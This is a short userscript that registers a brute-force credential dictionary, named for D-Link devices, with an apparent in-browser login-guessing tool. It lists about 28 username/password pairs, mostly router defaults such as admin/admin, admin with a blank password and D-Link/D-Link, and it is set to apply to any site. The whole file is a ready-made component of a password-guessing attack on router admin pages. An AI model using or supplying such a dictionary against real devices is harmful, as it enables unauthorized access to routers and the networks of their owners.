// ==UserScript==
// @name        www_brute_dict_dlink
// @namespace   www_brute_dict_dlink
// @version     1
// @grant       none
// ==/UserScript==

if( window.__brute == undefined )
	window.__brute = []

window.__brute.push( {
	allow: [ /.*/ ],
	deny: [],
	combo: [
		['admin', ''],
		['Admin', ''],
		['admin', 'admin'],
		['', 'admin'],
		['', '0'],
		['user', 'user'],
		['user', ''],
		['', 'admin'],
		['', 'private'],
		['', 'public'],
		['admin', 'sky'],
		['admin', 'password'],
		['admin', 'root'],
		['Admin', '1970'],
		['admin', 'olinda'],
		['admin', 'year2000'],
		['root', '1987197500'],
		['root', 'admin'],
		['', '211cmw91765'],
		['volcom75', ''],
		['admin', 'telus'],
		['D-Link', 'D-Link'],
		['1', 'admin'],
		['manager', 'manager'],
		['admin', 'public'],
		['administrator', '@*nigU^D.ha'],
		['88612421', '2421D'],
		['C', '192.168.0.1']
	],
	users: [],
	passwords: []
} )